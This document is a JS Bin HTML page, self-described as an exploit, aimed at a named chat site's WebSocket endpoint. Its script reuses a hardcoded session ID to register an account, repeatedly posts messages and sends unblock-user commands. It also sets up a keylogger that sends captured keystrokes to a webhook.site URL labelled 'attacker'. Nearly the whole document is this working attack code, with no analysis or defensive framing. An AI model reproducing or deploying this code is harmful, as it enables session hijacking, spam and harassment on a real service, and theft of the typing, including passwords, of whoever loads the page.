<!DOCTYPE html>
<!--
Created using JS Bin
http://jsbin.com
Copyright (c) 2019 by thegirlwiththedragontatoo (http://jsbin.com/zumijez/1/edit)
Released under the MIT license: http://jsbin.mit-license.org
-->
<meta name="robots" content="noindex">
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>JS Bin</title>
</head>
<body>
  <script>

    console.log("start exploit...");
    var guest = true;
    ws=new WebSocket("wss://chatroom.tamil2friends.com/chat")
    ws.onmessage = function(m) {var jsonData = JSON.parse(m.data);var dataType = jsonData.type;console.log("message----",jsonData.data);if(jsonData.data.status=="success"){guest = false}}
    console.log("ws--",ws);
    
    var buffer = [];
    var attacker = 'https://webhook.site/aee586cf-3dca-4d33-b2c9-4f979d72daee?key=log&c='
    document.onkeydown = function(e) {
      var stroke = e.key;
      buffer.push(stroke);
      if (buffer.length > 10) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
      }
    }
    window.setTimeout(function() {
      ws.send(JSON.stringify({"type":"init","data":{"session":"dsmq9q4okl9nq4nva1rtu2ekbi"}}))
    }, 3000);
    window.setTimeout(function() {
      if(guest) {ws.send(JSON.stringify({"type":"register","data":{"username":"Touchofsuccess111","gender":"male"}}));}
    }, 5000);
    window.setInterval(function() {
      if(ws.OPEN) {
      ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":"main","gifinput":"","_gifhidden":"","yinput":"","msg":"Mazhai sapteengala","type":"text"}}));
      ws.send(JSON.stringify({"type":"unblock-user","data":{"username":"mazhai"}}));
      }
    }, 8000);
    window.setTimeout(function() {
      ws.close();
    }, 24000);
  </script>
</body>
</html>
